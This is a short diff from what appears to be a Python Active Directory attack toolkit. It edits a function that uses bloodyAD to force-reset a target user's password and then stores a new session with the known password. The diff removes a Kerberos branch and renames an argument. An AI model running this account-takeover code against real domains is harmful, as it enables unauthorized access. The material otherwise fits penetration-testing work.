@@ -38,15 +38,6 @@ def attack_force_change(session, *parts, session_mgr=None):
             f"bloodyAD --host {session.target_ip} -d {session.domain} "
             f"{auth} --dc-ip {session.dc_ip} set password {target_user} '{DEFAULT_NEW_PASSWORD}'"
         )
-    else:
-        # Kerberos mode (no pass/hash)
-        if not session.dc_hostname:
-            print(red("[-] Kerberos mode requires session.dc_hostname (FQDN of domain controller)."))
-            return
-        bloody_cmd = (
-            f"bloodyAD --kerberos --host {session.dc_hostname} --dc-ip {session.dc_ip} "
-            f"-d {session.domain} set password {target_user} '{DEFAULT_NEW_PASSWORD}'"
-        )
 
     # === Attempt password change with BloodyAD ===
     out, err = run_command(bloody_cmd)
@@ -110,7 +101,7 @@ def _add_new_session(session_mgr, target_user, old_session):
         username=target_user,
         secret=DEFAULT_NEW_PASSWORD,
         domain=old_session.domain,
-        target_ip=old_session.target_ip,
+        target_ips=old_session.target_ip,
         dc_ip=old_session.dc_ip
     )
     print(green(f"[+] New session added: '{session_name}' for user '{target_user}' with password: {DEFAULT_NEW_PASSWORD}'"))
